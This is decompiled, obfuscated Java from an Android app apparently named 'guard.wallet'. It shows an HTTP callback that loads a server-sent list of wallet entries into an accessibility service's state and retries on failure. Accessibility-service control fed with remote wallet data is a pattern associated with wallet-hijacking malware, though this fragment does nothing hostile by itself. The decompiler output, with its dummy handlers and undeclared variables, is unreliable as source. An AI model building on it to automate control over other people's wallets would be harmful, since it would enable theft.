package com.guard.wallet.http;

import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import java.util.List;
import p0.j0;
import p0.l0;

public final class o implements p0.e {
   @Override
   public final void b(p0.e0 var1, IOException var2) {
      a1.q.s("NoCompleteWalletCallback", var2);
      if (!(var2 instanceof s.b)) {
         i.c(var1.c.a.h);
         l.x(var1, this);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void d(p0.e0 var1, j0 var2) {
      i.c(var1.c.a.h);
      l0 var7 = var2.g;
      label45:
      if (var7 != null) {
         Exception var10000;
         label47: {
            try {
               NoCompleteWalletCallback$1 var3 = new NoCompleteWalletCallback$1();
               var8 = (ApiResult)com.guard.wallet.utils.h.c(var7.z(), var3);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var10001 = false;
               break label47;
            }

            if (var8 == null) {
               break label45;
            }

            List var11;
            try {
               if (!var8.getSuccess()) {
                  break label45;
               }

               var11 = (List)var8.getData();
               if (MyAccessibilityService.P() == null || MyAccessibilityService.P().g == null) {
                  break label45;
               }

               var9 = MyAccessibilityService.P().g.p;
               var9.clear();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var12 = false;
               break label47;
            }

            if (var11 == null) {
               break label45;
            }

            try {
               if (!var11.isEmpty()) {
                  var9.addAll(var11);
               }
               break label45;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var13 = false;
            }
         }

         Exception var10 = var10000;
         a1.q.s("NoCompleteWalletCallback", var10);
      }

      var2.close();
   }
}
